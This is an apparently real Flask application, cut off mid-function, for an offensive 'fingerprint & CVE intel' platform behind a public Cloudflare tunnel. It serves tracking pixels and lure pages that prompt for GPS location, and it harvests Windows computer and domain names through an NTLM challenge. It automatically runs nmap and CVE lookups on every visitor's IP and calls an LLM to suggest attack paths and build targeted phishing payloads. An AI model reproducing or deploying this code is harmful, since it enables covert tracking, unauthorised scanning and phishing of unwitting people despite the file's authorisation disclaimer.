"""
SystemAnalyzer – Web-based pentesting fingerprint & CVE intel platform.
For use on networks/systems you own or have explicit written authorisation to test.
"""
import base64
import json
import os
import re
import signal
import socket
import subprocess
import sys
import threading
import time
import urllib.request
import uuid
from flask import (Flask, Response, abort, jsonify, redirect,
                   render_template, request, url_for)

import db
import fingerprint as fp_module
import cve_lookup

# ── App setup ────────────────────────────────────────────────────────────────
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "sysanalyzer-lab-secret-change-me")

@app.template_filter("from_json")
def from_json_filter(value):
    try:
        return json.loads(value) if isinstance(value, str) else value
    except Exception:
        return []

@app.template_global("enumerate")
def _enumerate(it, start=0):
    return enumerate(it, start)

db.init_db()

# ── Lab blueprint ─────────────────────────────────────────────────────────────
from lab import lab_bp
app.register_blueprint(lab_bp)

# ── Tunnel watchdog ───────────────────────────────────────────────────────────
_tunnel_lock   = threading.Lock()
_tunnel_url    = None          # current live public URL
_tunnel_status = "starting"   # "live" | "dead" | "starting" | "restarting"

def _read_tunnel_url_from_log():
    """Parse the cloudflared log file for the public URL."""
    try:
        with open("/tmp/cf.log") as f:
            txt = f.read()
        m = re.search(r'https://[a-z0-9-]+\.trycloudflare\.com', txt)
        return m.group(0) if m else None
    except Exception:
        return None

def _probe_url(url, timeout=5):
    """Return True if the URL responds with any HTTP status."""
    try:
        urllib.request.urlopen(url, timeout=timeout)
        return True
    except Exception as e:
        # Any HTTP error (4xx/5xx) still means tunnel is alive
        return hasattr(e, 'code')

def _launch_cloudflared():
    """Kill existing cloudflared and start a fresh one. Returns new URL or None."""
    global _tunnel_url, _tunnel_status
    subprocess.call(["pkill", "cloudflared"], stderr=subprocess.DEVNULL)
    time.sleep(1)
    try:
        open("/tmp/cf.log", "w").close()
    except Exception:
        pass
    subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:5000", "--no-autoupdate"],
        stdout=open("/tmp/cf.log", "w"),
        stderr=subprocess.STDOUT
    )
    # Wait up to 15s for URL to appear in log
    for _ in range(30):
        time.sleep(0.5)
        url = _read_tunnel_url_from_log()
        if url:
            return url
    return None

def _tunnel_watchdog():
    """Background thread: ensures cloudflared is always running."""
    global _tunnel_url, _tunnel_status
    CHECK_INTERVAL  = 20   # seconds between liveness checks
    RESTART_BACKOFF = 5    # seconds before retry after failed start

    # On startup, try to reuse an existing tunnel URL from a previous run
    existing = _read_tunnel_url_from_log()
    if existing and _probe_url(existing):
        with _tunnel_lock:
            _tunnel_url    = existing
            _tunnel_status = "live"
        print(f"[tunnel] reused existing tunnel: {existing}")
    else:
        # Start fresh
        with _tunnel_lock:
            _tunnel_status = "starting"
        url = _launch_cloudflared()
        with _tunnel_lock:
            _tunnel_url    = url
            _tunnel_status = "live" if url else "dead"
        if url:
            print(f"[tunnel] started: {url}")
        else:
            print("[tunnel] failed to start on boot")

    while True:
        time.sleep(CHECK_INTERVAL)
        with _tunnel_lock:
            current_url = _tunnel_url

        alive = bool(current_url) and _probe_url(current_url)

        if not alive:
            print("[tunnel] dead — restarting…")
            with _tunnel_lock:
                _tunnel_status = "restarting"
            url = _launch_cloudflared()
            with _tunnel_lock:
                _tunnel_url    = url
                _tunnel_status = "live" if url else "dead"
            if url:
                print(f"[tunnel] restarted: {url}")
            else:
                print("[tunnel] restart failed, will retry")
                time.sleep(RESTART_BACKOFF)

# Start watchdog as a daemon thread
_watchdog_thread = threading.Thread(target=_tunnel_watchdog, daemon=True, name="tunnel-watchdog")
_watchdog_thread.start()

# 1×1 transparent PNG (inline, no disk read needed)
_PIXEL_BYTES = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVQI12NgAAIABQ"
    "AABjkB6QAAAABJRU5ErkJggg=="
)


# ── Real-time SSE event bus ───────────────────────────────────────────────────
import queue as _queue_mod
_sse_clients      = []          # list of per-client Queue objects
_sse_clients_lock = threading.Lock()


def _push_event(event_type: str, data: dict):
    """Broadcast a JSON event to all connected SSE dashboard clients."""
    msg = f"data: {json.dumps({'type': event_type, 'data': data})}\n\n"
    with _sse_clients_lock:
        dead = []
        for q in _sse_clients:
            try:
                q.put_nowait(msg)
            except _queue_mod.Full:
                dead.append(q)
        for q in dead:
            _sse_clients.remove(q)


# ── Helpers ───────────────────────────────────────────────────────────────────

def _get_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    return xff.split(",")[0].strip() if xff else request.remote_addr


def _is_private_ip(ip: str) -> bool:
    """Return True for loopback / RFC-1918 / link-local addresses."""
    if not ip:
        return True
    priv = ("127.", "10.", "192.168.", "169.254.", "::1", "fc", "fd")
    return ip.startswith(priv) or ip.startswith("172.") and (
        16 <= int(ip.split(".")[1]) <= 31
    )


def _do_hostname_lookup(pixel_id: str, ip: str):
    """
    Three-method hostname resolution — runs server-side so browser restrictions don't apply.

    Method 1 — Reverse DNS  (works for all IPs; ISP rDNS filtered out)
    Method 2 — NetBIOS/WINS (Windows LAN hosts; needs nmblookup from samba-common)
    Method 3 — mDNS query   (macOS/Linux LAN hosts; uses 'dns-sd' or 'avahi-resolve')
    """
    resolved = None
    method   = None

    # ── Method 1: reverse DNS ────────────────────────────────────────────────
    try:
        rdns = socket.gethostbyaddr(ip)[0]
        # Filter junk rDNS like "45-33-32-156.ip.linodeusercontent.com" (contains IP octets)
        ip_parts = ip.split(".")
        is_junk  = any(p in rdns.replace("-", ".") for p in ip_parts)
        if rdns and not is_junk and "." in rdns:
            resolved = rdns
            method   = "rDNS"
    except Exception:
        pass

    # ── Method 2: NetBIOS (LAN Windows hosts) ────────────────────────────────
    if not resolved and _is_private_ip(ip):
        try:
            r = subprocess.run(
                ["nmblookup", "-A", ip],
                capture_output=True, text=True, timeout=8
            )
            for line in r.stdout.splitlines():
                # Lines look like:  MYPC             <00> - H
                if "<00>" in line and "GROUP" not in line and "<GROUP>" not in line:
                    name = line.split()[0].strip()
                    if name and name != ip:
                        resolved = name.upper()
                        method   = "NetBIOS"
                        break
        except Exception:
            pass

    # ── Method 3: mDNS (LAN macOS / Linux) ───────────────────────────────────
    if not resolved and _is_private_ip(ip):
        # Try 'dns-sd' (macOS) then 'avahi-resolve' (Linux)
        for cmd in (["dns-sd", "-Q", f"{'.'.join(reversed(ip.split('.')))}.in-addr.arpa.", "PTR"],
                    ["avahi-resolve", "--address", ip]):
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=4)
                for line in r.stdout.splitlines():
                    if ".local" in line.lower():
                        parts = line.split()
                        name  = next((p for p in parts if ".local" in p.lower()), None)
                        if name:
                            resolved = name.strip().rstrip(".")
                            method   = "mDNS"
                            break
                if resolved:
                    break
            except Exception:
                pass

    if resolved:
        db.update_resolved_hostname(pixel_id, resolved, method or "")
        _push_event("hostname_resolved", {
            "pixel_id": pixel_id,
            "hostname": resolved,
            "method":   method,
        })
        print(f"[hostname] {ip} → {resolved} ({method})")
    else:
        print(f"[hostname] {ip} → unresolved")


def _do_ip_intel(pixel_id: str, ip: str):
    """Fetch geolocation + ISP + VPN/proxy/hosting flags from ip-api.com (free)."""
    if _is_private_ip(ip):
        return
    try:
        fields = "status,country,countryCode,regionName,city,lat,lon,isp,org,as,proxy,hosting,mobile,timezone"
        url    = f"http://ip-api.com/json/{ip}?fields={fields}"
        req    = urllib.request.Request(url, headers={"User-Agent": "SystemAnalyzer/1.0"})
        with urllib.request.urlopen(req, timeout=8) as resp:
            data = json.loads(resp.read().decode())
        if data.get("status") == "success":
            db.upsert_ip_intel(pixel_id, ip, data)
            _push_event("ip_intel", {
                "pixel_id":    pixel_id,
                "country":     data.get("country"),
                "city":        data.get("city"),
                "isp":         data.get("isp"),
                "is_proxy":    data.get("proxy", False),
                "is_hosting":  data.get("hosting", False),
            })
            print(f"[ip-intel] {ip} → {data.get('city')}, {data.get('country')} / {data.get('isp')}")
    except Exception as e:
        print(f"[ip-intel] {ip}: {e}")


def _parse_nmap_ports(output: str) -> list:
    """Parse nmap -sV output → list of port dicts."""
    ports = []
    for line in output.splitlines():
        m = re.match(
            r'^(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)', line.strip()
        )
        if not m:
            continue
        port_num, proto, service, version_info = m.groups()
        version_info = version_info.strip()
        # Extract first version number like 2.4.51 or 8.9p1
        ver_match = re.search(r'(\d+[\.\d\w\-]+)', version_info)
        version   = ver_match.group(1) if ver_match else None
        # Product = text up to the version number
        product   = version_info[:ver_match.start()].strip() if ver_match else version_info
        if not product:
            product = service
        ports.append({
            "port":         int(port_num),
            "protocol":     proto,
            "service":      service,
            "product":      product.rstrip(),
            "version":      version,
            "version_info": version_info,
        })
    return ports


def _parse_nmap_os(output: str) -> str:
    """Extract OS guess from nmap output."""
    for line in output.splitlines():
        if line.startswith("OS details:") or line.startswith("Running:"):
            return line.strip()
    return None


def _parse_nmap_hostname(output: str) -> str:
    """Extract real computer name from nmap SMB/NBStat script output."""
    patterns = [
        r'NetBIOS name:\s*([A-Z0-9][A-Z0-9\-_]{0,30})',   # nbstat script
        r'Computer name:\s*([A-Z0-9][A-Z0-9\-_]{0,30})',  # smb-os-discovery
        r'NetBIOS computer name:\s*([A-Z0-9][A-Z0-9\-_]{0,30})',
    ]
    for pattern in patterns:
        m = re.search(pattern, output, re.IGNORECASE)
        if m:
            name = m.group(1).strip().rstrip("\\").rstrip("\x00")
            if name and name.upper() not in ("", "N/A", "UNKNOWN", "WORKGROUP"):
                return name.upper()
    return None


def _arp_lookup(ip: str) -> tuple:
    """
    Check ARP table and local DNS for LAN hostname.
    Returns (hostname, mac_address) or (None, None).
    Fast — reads kernel ARP cache, no network packets sent.
    """
    hostname = None
    mac      = None
    try:
        r = subprocess.run(["arp", "-n", ip], capture_output=True, text=True, timeout=3)
        # macOS: "? (192.168.1.x) at aa:bb:cc:dd:ee:ff on en0 ifscope [ethernet]"
        # Linux: "Address  HWtype  HWaddress  ..."
        mac_match = re.search(r'([0-9a-f]{2}(?::[0-9a-f]{2}){5})', r.stdout, re.IGNORECASE)
        if mac_match:
            mac = mac_match.group(1)
    except Exception:
        pass

    # Local reverse DNS (checks /etc/hosts + LAN DNS — instant, no external call)
    try:
        h = socket.gethostbyaddr(ip)[0]
        # Filter generic ISP rDNS: reject if it contains the IP digits
        ip_digits = ip.replace(".", "")
        if h and ip_digits[:6] not in h.replace(".", "").replace("-", ""):
            hostname = h
    except Exception:
        pass

    return hostname, mac


def _do_nmap_scan(pixel_id: str, ip: str):
    """Run nmap -sV + SMB/NBStat scripts against the target IP."""
    if _is_private_ip(ip):
        # For LAN IPs — still run lightweight hostname discovery
        hostname, mac = _arp_lookup(ip)
        if hostname:
            db.update_resolved_hostname(pixel_id, hostname, "LAN-rDNS")
            _push_event("hostname_resolved", {"pixel_id": pixel_id, "hostname": hostname, "method": "LAN-rDNS"})
            print(f"[arp] {ip} → {hostname} / {mac}")
        print(f"[nmap] skipping internet scan for private IP {ip}")
        return

    # Check nmap is available
    if subprocess.call(["which", "nmap"], stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL) != 0:
        print("[nmap] nmap not found — install it: brew install nmap / apt install nmap")
        db.upsert_nmap(pixel_id, ip, "unavailable")
        return

    print(f"[nmap] scanning {ip} for {pixel_id}…")
    db.upsert_nmap(pixel_id, ip, "running")
    _push_event("nmap_start", {"pixel_id": pixel_id, "ip": ip})

    try:
        result = subprocess.run(
            ["nmap", "-sV", "--version-intensity", "5",
             "--top-ports", "1000", "-T4", "--open",
             # SMB scripts pull real Windows computer name + OS from port 445
             "--script", "smb-os-discovery,nbstat",
             ip],
            capture_output=True, text=True, timeout=180
        )
        output    = result.stdout
        ports     = _parse_nmap_ports(output)
        os_guess  = _parse_nmap_os(output)

        db.upsert_nmap(pixel_id, ip, "complete", output, ports, os_guess)
        print(f"[nmap] {ip} → {len(ports)} open ports")

        # ── Extract real hostname from SMB/NBStat script output ────────────
        nmap_hostname = _parse_nmap_hostname(output)
        if nmap_hostname:
            db.update_resolved_hostname(pixel_id, nmap_hostname, "nmap-SMB")
            _push_event("hostname_resolved", {
                "pixel_id": pixel_id,
                "hostname": nmap_hostname,
                "method":   "nmap-SMB",
            })
            print(f"[nmap-smb] {ip} → {nmap_hostname}")

        # Auto-lookup CVEs for discovered services with known versions
        _do_nmap_cve_lookup(pixel_id, ports)

        _push_event("nmap_complete", {
            "pixel_id":   pixel_id,
            "ip":         ip,
            "port_count": len(ports),
            "os_guess":   os_guess,
            "hostname":   nmap_hostname,
        })

    except subprocess.TimeoutExpired:
        db.upsert_nmap(pixel_id, ip, "timeout")
        print(f"[nmap] scan of {ip} timed out")
    except Exception as e:
        db.upsert_nmap(pixel_id, ip, "failed")
        print(f"[nmap] error scanning {ip}: {e}")


def _do_nmap_cve_lookup(pixel_id: str, ports: list):
    """For each nmap-discovered service with a version, look up CVEs."""
    terms = []
    for p in ports:
        product = p.get("product", "")
        version = p.get("version", "")
        if not product or not version:
            continue
        # Build a search term like cve_lookup expects
        label   = f"{product} {version} (port {p['port']})"
        keyword = f"{product} {version}"
        terms.append({"component": label, "version": version, "keyword": keyword})

    if not terms:
        return
    try:
        results = cve_lookup.lookup_all(terms)
        for component, data in results.items():
            db.insert_cves(pixel_id, component, data["version"], data["cves"])
        print(f"[nmap-cve] {pixel_id}: inserted CVEs for {len(results)} nmap services")
    except Exception as e:
        print(f"[nmap-cve] {pixel_id}: {e}")


def _do_cve_lookup(pixel_id: str, parsed: dict, detected_apps: list = None, js_payload: dict = None):
    """Run CVE lookup in background and persist results.
    Client Hints data (ua_os / ua_os_version) overrides UA-parsed OS when available
    because Chrome 110+ sends reduced/frozen UA strings with wrong OS versions."""
    enriched = dict(parsed)
    if js_payload:
        ua_os  = js_payload.get("ua_os")
        ua_ver = js_payload.get("ua_os_version")
        if ua_os and ua_ver:
            # Map Client Hints platform names to our internal OS family names
            _hints_os_map = {
                "macos":   "Mac OS X",
                "windows": "Windows",
                "android": "Android",
                "ios":     "iOS",
                "linux":   "Linux",
                "chromeos":"Chrome OS",
            }
            mapped = _hints_os_map.get(ua_os.lower(), ua_os)
            enriched["os_family"]  = mapped
            enriched["os_version"] = ua_ver
        elif ua_os and not ua_ver:
            _hints_os_map = {
                "macos":"Mac OS X","windows":"Windows","android":"Android",
                "ios":"iOS","linux":"Linux","chromeos":"Chrome OS"
            }
            enriched["os_family"] = _hints_os_map.get(ua_os.lower(), ua_os)
    terms = fp_module.build_search_terms_with_apps(enriched, detected_apps or [])
    results = cve_lookup.lookup_all(terms)
    for component, data in results.items():
        db.insert_cves(pixel_id, component, data["version"], data["cves"])


# ── Routes ────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return redirect(url_for("dashboard"))


@app.route("/dashboard")
def dashboard():
    targets = db.get_all_targets()
    return render_template("dashboard.html", targets=targets)


@app.route("/target/<pixel_id>")
def target_detail(pixel_id):
    data = db.get_target(pixel_id)
    if not data["fingerprint"] and not data["hits"]:
        abort(404)
    # Group CVEs by component for the template
    cves_by_component = {}
    for c in data["cves"]:
        cves_by_component.setdefault(c["component"], []).append(c)
    # Load IP intel and nmap data
    ip_intel  = db.get_ip_intel(pixel_id)
    nmap_row  = db.get_nmap(pixel_id)
    open_ports = []
    if nmap_row and nmap_row.get("open_ports"):
        try:
            open_ports = json.loads(nmap_row["open_ports"])
        except Exception:
            open_ports = []
    return render_template("target.html",
                           pixel_id=pixel_id,
                           fp=data["fingerprint"],
                           hits=data["hits"],
                           cves_by_component=cves_by_component,
                           ip_intel=ip_intel,
                           nmap=nmap_row,
                           open_ports=open_ports)


def _get_lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def _get_public_url():
    """Return the current live public tunnel URL from the watchdog state."""
    with _tunnel_lock:
        return _tunnel_url


@app.route("/generate")
def generate_pixel():
    """Create a new tracking pixel ID and return embed codes."""
    pixel_id   = uuid.uuid4().hex
    lan_ip     = _get_lan_ip()
    port       = request.host.split(":")[-1] if ":" in request.host else "5000"
    lan_base   = f"http://{lan_ip}:{port}"
    public_url = _get_public_url()
    active_base = public_url if public_url else lan_base
    pixel_url = f"{active_base}/pixel/{pixel_id}.png"
    js_url    = f"{active_base}/fp.js?pid={pixel_id}"
    demo_url  = f"{active_base}/demo/{pixel_id}"
    return render_template("generate.html",
                           pixel_id=pixel_id,
                           pixel_url=pixel_url,
                           js_url=js_url,
                           demo_url=demo_url,
                           base_url=active_base,
                           lan_ip=lan_ip,
                           public_url=public_url)


@app.route("/demo/<pixel_id>")
def demo_page(pixel_id):
    """A convincing demo webpage with the tracking pixel + JS auto-embedded."""
    # Always use the incoming request host so pixel/JS URLs work through
    # whatever tunnel or IP the visitor used to reach this page
    base_url  = request.host_url.rstrip("/")
    pixel_url = f"{base_url}/pixel/{pixel_id}.png"
    # geo=1 — demo/lure pages request GPS location for maximum intel
    js_url    = f"{base_url}/fp.js?pid={pixel_id}&geo=1"
    return render_template("demo.html",
                           pixel_id=pixel_id,
                           pixel_url=pixel_url,
                           js_url=js_url)


@app.route("/ntlm-probe/<pixel_id>")
def ntlm_probe(pixel_id):
    """
    NTLM auth challenge endpoint.
    On Windows (IE / Legacy Edge / domain-joined Chrome), the browser
    automatically sends a Type-1 NTLM Negotiate message containing the
    real computer name and domain when challenged with 401 + WWW-Authenticate: NTLM.
    We parse that message, store the names, and return 200 so no login dialog appears.
    """
    auth = request.headers.get("Authorization", "")
    if not auth.upper().startswith("NTLM "):
        return Response(
            "auth required", status=401,
            headers={
                "WWW-Authenticate": "NTLM",
                "Access-Control-Allow-Origin":      "*",
                "Access-Control-Allow-Credentials": "true",
            }
        )
    # Parse NTLM Type-1 negotiate message
    computer, domain = _parse_ntlm_type1(auth[5:])
    if computer or domain:
        db.update_ntlm(pixel_id, computer, domain)
    resp = Response("OK", status=200)
    resp.headers["Access-Control-Allow-Origin"]      = "*"
    resp.headers["Access-Control-Allow-Credentials"] = "true"
    resp.headers["X-Computer-Name"] = computer or ""
    resp.headers["X-Domain-Name"]   = domain   or ""
    return resp


def _parse_ntlm_type1(b64_token: str):
    """Parse NTLM Type-1 Negotiate message → (computer_name, domain)."""
    import struct
    try:
        token = base64.b64decode(b64_token + "==")
        if token[:8] != b"NTLMSSP\x00":
            return None, None
        msg_type = struct.unpack_from("<I", token, 8)[0]
        if msg_type != 1:
            return None, None

        def read_field(offset):
            length = struct.unpack_from("<H", token, offset)[0]
            start  = struct.unpack_from("<I", token, offset + 4)[0]
            if length == 0 or start + length > len(token):
                return None
            raw = token[start:start + length]
            for enc in ("utf-16-le", "ascii", "utf-8"):
                try: return raw.decode(enc).strip()
                except: pass
            return None

        domain   = read_field(16)  # DomainNameFields
        computer = read_field(24)  # WorkstationFields
        return computer, domain
    except Exception:
        return None, None


@app.route("/demo-go/<pixel_id>")
def demo_go(pixel_id):
    """Stable local redirect — always sends to the current public demo URL.
    Share /demo-go/<id> via LAN; browser is redirected to the live tunnel."""
    public_url = _get_public_url()
    if public_url:
        return redirect(f"{public_url}/demo/{pixel_id}", code=302)
    # Fallback: serve the demo page directly over LAN
    return redirect(url_for("demo_page", pixel_id=pixel_id))


# ── Pixel endpoint ─────────────────────────────────────────────────────────

@app.route("/pixel/<pixel_id>.png")
def pixel(pixel_id):
    ip         = _get_ip()
    user_agent = request.headers.get("User-Agent", "")
    referrer   = request.headers.get("Referer", "")
    accept_lang= request.headers.get("Accept-Language", "")
    headers_raw= {k: v for k, v in request.headers if k not in
                  ("Cookie", "Authorization")}

    # Persist the raw hit
    db.insert_hit(pixel_id, ip, user_agent, referrer, accept_lang, headers_raw)

    # Parse UA and write a fingerprint row immediately so the target appears on the dashboard
    parsed = fp_module.parse_ua(user_agent)
    db.insert_fingerprint(pixel_id, ip, parsed, {
        "referrer": referrer,
        "language": accept_lang.split(",")[0] if accept_lang else None,
    })

    # Push real-time notification to dashboard SSE clients
    _push_event("new_hit", {
        "pixel_id":  pixel_id,
        "ip":        ip,
        "os":        parsed.get("os_raw") or parsed.get("os_family", "Unknown"),
        "browser":   parsed.get("browser_family", ""),
        "ts":        time.strftime("%H:%M:%S", time.gmtime()),
    })

    # Background: CVE lookup + IP intelligence + hostname + Nmap (all parallel)
    threading.Thread(target=_do_cve_lookup,       args=(pixel_id, parsed),   daemon=True).start()
    threading.Thread(target=_do_ip_intel,         args=(pixel_id, ip),        daemon=True).start()
    threading.Thread(target=_do_hostname_lookup,  args=(pixel_id, ip),        daemon=True).start()
    threading.Thread(target=_do_nmap_scan,        args=(pixel_id, ip),        daemon=True).start()

    return Response(
        _PIXEL_BYTES,
        mimetype="image/png",
        headers={
            "Cache-Control": "no-store, no-cache, must-revalidate",
            "Pragma":        "no-cache",
        }
    )


# ── JS fingerprint collection endpoint ───────────────────────────────────────

@app.route("/collect", methods=["POST"])
def collect():
    """Receives the full JS fingerprint payload."""
    try:
        payload = request.get_json(force=True) or {}
    except Exception:
        return jsonify({"status": "error"}), 400

    pixel_id   = payload.get("pid", "unknown")
    ip         = _get_ip()
    user_agent = request.headers.get("User-Agent", "")
    stage      = payload.get("stage", "unknown")

    # ── Stage 'geo' is a dedicated GPS packet — store it and return early ─────
    if stage == "geo":
        db.update_gps(pixel_id,
                      payload.get("geo_lat"),
                      payload.get("geo_lon"),
                      payload.get("geo_accuracy"),
                      payload.get("geo_altitude"),
                      payload.get("geo_speed"),
                      payload.get("geo_heading"))
        _push_event("gps_update", {
            "pixel_id":    pixel_id,
            "lat":         payload.get("geo_lat"),
            "lon":         payload.get("geo_lon"),
            "accuracy_m":  payload.get("geo_accuracy"),
        })
        print(f"[gps] {pixel_id}: {payload.get('geo_lat'):.5f}, {payload.get('geo_lon'):.5f} ±{payload.get('geo_accuracy')}m")
        return jsonify({"status": "ok"})

    parsed         = fp_module.parse_ua(user_agent)
    detected_apps  = payload.get("detected_apps", [])
    db.insert_fingerprint(pixel_id, ip, parsed, payload)

    # Push enriched fingerprint event to dashboard
    _push_event("fingerprint_update", {
        "pixel_id": pixel_id,
        "ip":       ip,
        "os":       payload.get("ua_os") or parsed.get("os_raw") or parsed.get("os_family", ""),
        "browser":  parsed.get("browser_family", ""),
        "stage":    stage,
    })

    # Trigger CVE lookup — pass full JS payload so Client Hints override UA parsing
    threading.Thread(
        target=_do_cve_lookup, args=(pixel_id, parsed, detected_apps, payload), daemon=True
    ).start()

    # IP intel only if not already done (pixel endpoint fires first)
    threading.Thread(
        target=_do_ip_intel, args=(pixel_id, ip), daemon=True
    ).start()

    return jsonify({"status": "ok"})


# ── Static JS payload ─────────────────────────────────────────────────────────

@app.route("/fp.js")
def serve_fp_js():
    pixel_id   = request.args.get("pid", "unknown")
    # geo=1 enables GPS geolocation prompt (for social-engineering lure pages)
    enable_geo = request.args.get("geo", "0")
    base_url   = request.host_url.rstrip("/")
    js_content = _build_fp_js(pixel_id, base_url, enable_geo)
    return Response(js_content, mimetype="application/javascript")


def _build_fp_js(pixel_id: str, base_url: str, enable_geo: str = "0") -> str:
    with open("static/fp.js") as f:
        template = f.read()
    return (template
            .replace("__PIXEL_ID__",    pixel_id)
            .replace("__COLLECT_URL__", f"{base_url}/collect")
            .replace("__BASE_URL__",    base_url)
            .replace("__ENABLE_GEO__",  enable_geo))


# ── Tunnel management ─────────────────────────────────────────────────────────

@app.route("/api/tunnel/status")
def api_tunnel_status():
    with _tunnel_lock:
        url    = _tunnel_url
        status = _tunnel_status
    alive = (status == "live") and bool(url)
    return jsonify({"url": url, "alive": alive, "status": status})


@app.route("/api/tunnel/restart", methods=["POST"])
def api_tunnel_restart():
    """Force an immediate tunnel restart via the watchdog."""
    global _tunnel_url, _tunnel_status
    with _tunnel_lock:
        _tunnel_status = "restarting"
        _tunnel_url    = None
    # Run restart in a background thread so the HTTP response returns immediately
    def _do_restart():
        global _tunnel_url, _tunnel_status
        url = _launch_cloudflared()
        with _tunnel_lock:
            _tunnel_url    = url
            _tunnel_status = "live" if url else "dead"
    threading.Thread(target=_do_restart, daemon=True).start()
    return jsonify({"status": "restarting"})


# ── Real-time SSE endpoint ────────────────────────────────────────────────────

@app.route("/api/events")
def api_events():
    """Server-Sent Events stream — pushes real-time hit/scan events to dashboard."""
    from flask import stream_with_context
    q = _queue_mod.Queue(maxsize=50)
    with _sse_clients_lock:
        _sse_clients.append(q)

    def generate():
        try:
            yield "data: {\"type\":\"connected\"}\n\n"
            while True:
                try:
                    msg = q.get(timeout=25)
                    yield msg
                except _queue_mod.Empty:
                    yield "data: {\"type\":\"ping\"}\n\n"
        finally:
            with _sse_clients_lock:
                try:
                    _sse_clients.remove(q)
                except ValueError:
                    pass

    return Response(
        stream_with_context(generate()),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


# ── Nmap + IP Intel routes ────────────────────────────────────────────────────

@app.route("/api/scan/<pixel_id>", methods=["POST"])
def api_scan(pixel_id):
    """Manually trigger an nmap scan for a target pixel."""
    data = db.get_target(pixel_id)
    if not data["fingerprint"]:
        return jsonify({"error": "target not found"}), 404
    ip = data["fingerprint"].get("ip")
    if not ip:
        return jsonify({"error": "no IP address on record"}), 400
    if _is_private_ip(ip):
        return jsonify({"error": f"{ip} is a private/LAN address — nmap won't reach it over the internet"}), 400
    threading.Thread(target=_do_nmap_scan, args=(pixel_id, ip), daemon=True).start()
    return jsonify({"status": "started", "ip": ip})


@app.route("/api/nmap/<pixel_id>")
def api_nmap_status(pixel_id):
    """Return the latest nmap scan result for a target."""
    row = db.get_nmap(pixel_id)
    if row and row.get("open_ports"):
        try:
            row["open_ports"] = json.loads(row["open_ports"])
        except Exception:
            row["open_ports"] = []
    return jsonify(row)


@app.route("/api/ip-intel/<pixel_id>")
def api_ip_intel(pixel_id):
    """Return IP intelligence data for a target."""
    return jsonify(db.get_ip_intel(pixel_id))


# ── LLM endpoints ─────────────────────────────────────────────────────────────

@app.route("/api/ai-analyze/<pixel_id>")
def api_ai_analyze(pixel_id):
    """Stream a Claude CVE analysis for a target as SSE."""
    import llm_analyst
    from flask import stream_with_context
    data = db.get_target(pixel_id)
    fp   = data.get("fingerprint", {})
    cves = data.get("cves", [])
    def generate():
        try:
            yield from llm_analyst.analyze_target_stream(fp, cves)
        except RuntimeError as e:
            yield f"data: {json.dumps(str(e))}\n\ndata: [DONE]\n\n"
        except Exception as e:
            yield f"data: {json.dumps(f'Error: {e}')}\n\ndata: [DONE]\n\n"
    return Response(
        stream_with_context(generate()),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"}
    )


@app.route("/api/attack-paths/<pixel_id>")
def api_attack_paths(pixel_id):
    """Return LLM-generated attack chain suggestions as JSON."""
    import llm_analyst
    data = db.get_target(pixel_id)
    try:
        paths = llm_analyst.suggest_attack_paths(
            data.get("fingerprint", {}),
            data.get("cves", [])
        )
        return jsonify({"paths": paths})
    except RuntimeError as e:
        return jsonify({"error": str(e)}), 503
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/nl-query", methods=["POST"])
def api_nl_query():
    """Convert a natural-language question to SQL and run it."""
    import llm_analyst
    body     = request.get_json(force=True) or {}
    question = body.get("question", "").strip()
    if not question:
        return jsonify({"error": "empty question"}), 400
    result = llm_analyst.run_nl_query(question, str(db.DB_PATH))
    return jsonify(result)


@app.route("/api/ai-status")
def api_ai_status():
    """Return LLM provider status."""
    import llm_analyst
    return jsonify(llm_analyst.ai_status())


@app.route("/api/models")
def api_models():
    """Return available models grouped by provider."""
    import llm_analyst
    return jsonify(llm_analyst.list_models())


@app.route("/api/models/select", methods=["POST"])
def api_model_select():
    """Switch active model at runtime."""
    import llm_analyst
    data     = request.get_json(force=True) or {}
    provider = data.get("provider", "").strip()
    model    = data.get("model", "").strip()
    if not provider or not model:
        return jsonify({"error": "provider and model are required"}), 400
    result = llm_analyst.select_model(provider, model)
    return jsonify(result)


# ── Target Profiler ──────────────────────────────────────────────────────────

@app.route("/api/profile/<pixel_id>")
def api_profile(pixel_id):
    import llm_analyst
    data = db.get_target(pixel_id)
    if not data:
        return jsonify({"error": "Target not found"}), 404
    fp   = data["fingerprint"] or {}
    cves = data["cves"] or []
    hits = data["hits"] or []
    result = llm_analyst.profile_target(fp, cves, hits)
    return jsonify(result)


# ── Phishing Payload Builder ──────────────────────────────────────────────────

@app.route("/api/phishing/<pixel_id>", methods=["POST"])
def api_phishing(pixel_id):
    import llm_analyst
    data = db.get_target(pixel_id)
    if not data:
        return jsonify({"error": "Target not found"}), 404
    body         = request.get_json(force=True) or {}
    payload_type = body.get("payload_type", "Corporate IT Security Alert")
    custom_note  = body.get("custom_note", "")
    fp   = data["fingerprint"] or {}
    cves = data["cves"] or []
    result = llm_analyst.build_phishing_payload(fp, cves, payload_type, custom_note)
    return jsonify(result)


@app.route("/api/phishing/types")
def api_phishing_types():
    import llm_analyst
    return jsonify({"types": llm_analyst.PAYLOAD_TYPES})


# ── Behavioural Analysis ──────────────────────────────────────────────────────

@app.route("/api/behaviour/<pixel_id>")
def api_behaviour(pixel_id):
    import llm_analyst
    data = db.get_target(pixel_id)
    if not data:
        return jsonify({"error": "Target not found"}), 404
    fp   = data["fingerprint"] or {}
    hits = data["hits"] or []
    tz   = fp.get("timezone")
    return jsonify(llm_analyst.analyse_behaviour(hits, tz))


# ── Session Summary ───────────────────────────────────────────────────────────

@app.route("/api/session-summary")
def api_session_summary():
    import llm_analyst, sqlite3
    targets = db.get_all_targets()
    # Get all CVEs
    conn = sqlite3.connect("data/targets.db")
    conn.row_factory = sqlite3.Row
    all_cves = [dict(r) for r in conn.execute(
